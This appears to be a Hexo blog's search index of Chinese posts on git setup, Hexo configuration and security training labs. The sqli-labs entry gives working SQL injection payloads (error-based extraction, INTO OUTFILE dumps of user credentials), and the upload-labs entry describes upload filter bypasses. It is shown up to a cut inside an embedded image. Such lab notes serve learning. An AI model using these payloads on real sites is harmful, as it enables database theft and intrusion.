<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>git新建仓库</title>
    <url>/2021/12/04/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p>git新建仓库上传代码</p>
<span id="more"></span>

<img src="/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png" alt="image-20211204165449892" style="zoom: 67%;" />

<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>
<p>在该文件夹下打开git bash</p>
<p>输入下列命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line">git init  会生成.git文件夹</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git branch -M master</span><br><span class="line">//使用ssh之前要先配置公钥</span><br><span class="line">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo多设备操作</title>
    <url>/2021/12/04/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>在解决掉hexo图片路径的问题后,着手解决hexo多设备更新文章的问题<span id="more"></span></p>
<p>首先在新设备上面安装Node.js和Git</p>
<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>
<p><img src="/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png" alt="image-20211204031522619"></p>
<p>确保该分支中文件为空</p>
<p>在要安装hexo的地方打开git bash,生成SSH公钥添加到Github</p>
<p><code>git config --global user.name &quot;yourname&quot;</code></p>
<p><code>git config --global user.email &quot;youremail&quot;</code></p>
<p>可以用这两条命令检查有没有输对</p>
<p><code>git config user.name</code></p>
<p><code>git config user.email</code></p>
<p>确保正确后</p>
<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>
<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>
<p>在父目录打开git bash</p>
<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>
<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>
<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>
<p>接着安装hexo </p>
<p><code>npm install -g hexo cli</code></p>
<p>这个时候记得将当前目录切换为hexo目录</p>
<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>接下来在有.git文件夹的目录下打开git bash</p>
<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>
<p><code>git init</code></p>
<p>将当前目录下的文件放到暂存区(上膛)</p>
<p><code>git add .</code></p>
<p>可以用<code>git status</code>查看当前文件状态</p>
<p>接着用<code>git commit -m &quot;本次提交的描述信息&quot;</code>提交描述信息</p>
<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>
<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>
<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>
<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>
<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>
<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>
<p>如果不嫌麻烦的话,每次写完文章</p>
<p>git bash 五连击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;new page&quot;</span></span><br><span class="line">git push origin <span class="built_in">source</span></span><br></pre></td></tr></table></figure>

<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>
<p>有时因为一些文件并不是直接创建或者删除,而是做了修改,git可能提示会需要merge</p>
<p>这个时候采用强制覆盖本地文件的方式</p>
<p><code>git fetch --all</code></p>
<p><code>git reset --hard origin/分支名称</code></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>github</tag>
        <tag>hexo</tag>
        <tag>github公钥设置</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo上传图片</title>
    <url>/2021/12/02/pic-hexo/</url>
    <content><![CDATA[<p>参考文章:</p>
<p><a href="https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>
<p>所有的博客文件保存在_post目录下</p>
<span id="more"></span>

<p>在source下新建一个images文件夹</p>
<p>打开Typora的 文件-&gt;偏好设置</p>
<p><img src="/images/pic-hexo/image-20211203001406102.png"></p>
<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>
<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>
<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>
<p>会在md文件中会自动添加这一段</p>
<p><img src="/images/pic-hexo/image-20211202174427901.png"></p>
<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这种方式还是很不稳定,最后采用了腾讯云COS+picgo+typora的方式</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo上传图片</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2021/12/02/sqli-labs/</url>
    <content><![CDATA[<p>sqli-labs</p>
<p>less3   less4</p>
<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>
<p>通过单引号报错信息</p>
<p>推测可能在接收参数后添加了( )包裹了id参数</p>
<p><img src="/images/sqli-labs/Image.png"></p>
<p><img src="/images/sqli-labs/Image%20%5B1%5D.png"></p>
<p>通过构造闭合即可</p>
<p>id=1’)%23</p>
<p>接下来用union联合注入即可</p>
<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>
<p>根据报错注入公式,开始操作</p>
<p>库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>

<p>表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>

<p>列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>

<p>利用right和left函数相互配合爆出字段名s</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>

<p>如法炮制,爆数据即可</p>
<h5 id="less-7"><a href="#less-7" class="headerlink" title="less 7"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>
<p>通过之前的less进行查询</p>
<p>@@basedir是mysql安装路径</p>
<p>@@datadir是数据库路径</p>
<p><img src="/images/sqli-labs/1.png"></p>
<p>2.读写权限测试mysql快速查看读写权限</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sqli-labs/2.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>

<p>如果返回正常,则说明有读写权限</p>
<p><img src="/images/sqli-labs/3.png"></p>
<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,table_name<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">%</span><span class="number">20</span><span class="operator">=</span><span class="operator">%</span><span class="number">27</span>security<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">2.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>通过上述语句查询表名,写入到2.txt</p>
<p><img src="/images/sqli-labs/4.png"></p>
<p>貌似文件只能新建,不能重复写入<br>查询列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,column_name<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.columns<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_name<span class="operator">%</span><span class="number">20</span><span class="operator">=</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>users<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">3.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>查询数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>security.users<span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">4.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sqli</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo的next主题配置搜索功能</title>
    <url>/2021/12/04/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<p>1.安装插件</p>
<p><code>npm install hexo-generator-searchdb --save</code></p>
<p>2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true</p>
<p>3.将下列参数添加到hexo的配置文件中(_config.yml)</p>
<p>hexo的搜索功能是基于public下的search.xml文件实现的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>即可在线使用搜索功能</p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h4><p>安装searchdb插件后</p>
<p>如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>-hexo -Next主题搜索功能</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2021/12/05/upload-labs/</url>
    <content><![CDATA[<p>upload-labs笔记</p>
<span id="more"></span>

<h5 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h5><p>查看网页源代码发现是js本地判断文件格式,禁用js即可上传成功</p>
<h5 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h5><p>抓包分析,更改Content-Type为image/jpeg即可</p>
<h5 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h5><p>查看代码后发现是黑名单禁止,并且大小写,空格,加点,换行均不能绕过,所以考虑到使用php3,phtml绕过,但是执行需要服务器开启响应扩展才行..局限性:默认是无法解析这种后缀的,而且只在php5.2.17上可以开启并实现,其余版本均失败<img src="data:image/png;base64,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